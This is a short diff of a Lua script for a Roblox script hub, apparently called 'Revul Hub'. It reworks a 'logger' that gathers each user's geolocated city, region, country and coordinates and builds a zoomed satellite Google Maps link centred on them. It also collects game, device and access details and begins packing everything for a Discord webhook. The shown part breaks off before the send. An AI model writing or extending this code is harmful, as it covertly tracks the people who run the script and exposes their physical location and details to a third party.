@@ -56,31 +56,35 @@ end)
 -- 📍 Ubicación formateada
 local fullLocation = city .. ", " .. region .. ", " .. country
 
--- 🗺️ Maps con zoom
-local mapsLink = "https://www.google.com/maps/@"
-    .. lat .. "," .. lon .. ",15z"
+-- 🗺️ LINK SATÉLITE + ZOOM + CENTRADO
+local mapsLink = "https://www.google.com/maps/@?api=1&map_action=map" ..
+"&center=" .. lat .. "," .. lon ..
+"&zoom=18" ..
+"&basemap=satellite"
 
--- 🎮 Nombre del juego
-local gameName = "Unknown"
+-- 🎮 Nombre del juego (fallback seguro)
+local gameName = "Unknown Game"
 pcall(function()
     local info = MarketplaceService:GetProductInfo(game.PlaceId)
-    gameName = info.Name or "Unknown"
+    if info and info.Name then
+        gameName = info.Name
+    end
 end)
 
 -- 👥 Jugadores en server
 local playersCount = #Players:GetPlayers()
 local maxPlayers = Players.MaxPlayers
 
--- 📱 Tipo de dispositivo
+-- 📱 Dispositivo
 local deviceType = UserInputService.TouchEnabled and "Mobile" or "PC"
 
 -- 🔐 Tipo de acceso
 local accessType = WHITELIST[player.UserId] and "Whitelist" or "Key"
 
--- 📅 Fecha y hora unificada
+-- 📅 Fecha y hora
 local timeStamp = os.date("%Y-%m-%d %H:%M:%S")
 
--- 📡 Enviar a Discord
+-- 📡 Data Discord
 local data = {
     ["username"] = "Revul Hub Logger",
     ["embeds"] = {{
